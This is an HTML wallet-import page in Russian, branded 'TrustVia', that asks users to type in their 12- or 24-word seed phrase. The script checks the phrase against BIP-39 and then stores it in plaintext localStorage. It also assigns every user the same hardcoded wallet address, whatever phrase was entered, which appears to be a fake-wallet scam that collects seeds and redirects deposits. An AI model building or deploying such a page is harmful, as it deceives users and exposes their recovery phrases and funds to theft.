<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TrustVia — Импорт</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/bip39@3.1.0/index.min.js"></script>
    <style>
        body { background: #0b0b0b; color: white; font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; min-height: 100dvh; }
        .header { padding: 24px 20px; display: flex; align-items: center; background: rgba(11,11,11,0.9); backdrop-filter: blur(10px); border-bottom: 1px solid #1a1a1a; }
        .back-btn { font-size: 40px; color: #00d676; cursor: pointer; font-weight: bold; }
        h1 { flex: 1; text-align: center; font-size: 36px; font-weight: 900; margin: 0; }
        p { text-align: center; color: #aaa; font-size: 17px; margin: 32px 0 48px; line-height: 1.6; padding: 0 20px; }
        textarea { background: #141414; border: 1px solid #444; color: white; border-radius: 28px; padding: 24px; font-size: 17px; font-family: monospace; width: 100%; height: 200px; resize: none; outline: none; transition: all 0.4s; box-shadow: inset 0 4px 12px rgba(0,0,0,0.6); }
        textarea:focus { border-color: #00d676; box-shadow: 0 0 0 4px rgba(0,214,118,0.3); }
        .error-msg { color: #ff4d4d; font-size: 16px; margin-top: 16px; text-align: center; display: none; }
        .btn { background: linear-gradient(135deg, #00d676, #00ff9d); color: black; font-weight: 700; border-radius: 9999px; padding: 20px; width: 100%; font-size: 18px; border: none; cursor: pointer; transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1); box-shadow: 0 12px 48px rgba(0,214,118,0.45); margin-top: 48px; }
        .btn:hover { transform: translateY(-8px) scale(1.05); box-shadow: 0 20px 70px rgba(0,214,118,0.6); }
    </style>
</head>
<body class="p-6">

    <div class="header">
        <div class="back-btn" onclick="history.back()">←</div>
        <h1>Импорт кошелька</h1>
    </div>

    <p>Введите 12 или 24 слова секретной фразы через пробел</p>

    <textarea id="phraseInput" placeholder="word1 word2 word3 word4 ..."></textarea>
    <p id="import-error" class="error-msg"></p>

    <button class="btn" onclick="handleImport()">Восстановить кошелёк</button>

    <script>
        function handleImport() {
            const phrase = document.getElementById('phraseInput').value.trim();
            const errorEl = document.getElementById('import-error');

            errorEl.style.display = 'none';

            if (!phrase) {
                errorEl.textContent = 'Введите секретную фразу';
                errorEl.style.display = 'block';
                return;
            }

            const words = phrase.split(/\s+/).filter(w => w);
            if (words.length !== 12 && words.length !== 24) {
                errorEl.textContent = 'Фраза должна содержать ровно 12 или 24 слова';
                errorEl.style.display = 'block';
                return;
            }

            if (!bip39.validateMnemonic(phrase)) {
                errorEl.textContent = 'Неверная фраза — слова не из словаря BIP-39 или контрольная сумма не совпадает';
                errorEl.style.display = 'block';
                return;
            }

            localStorage.setItem('mnemonic', phrase);
            localStorage.setItem('walletAddress', '0xc519118cd0c74879bd3FbF5fEaca473397540862');
            window.location.href = 'index.html';
        }
    </script>

</body>
</html>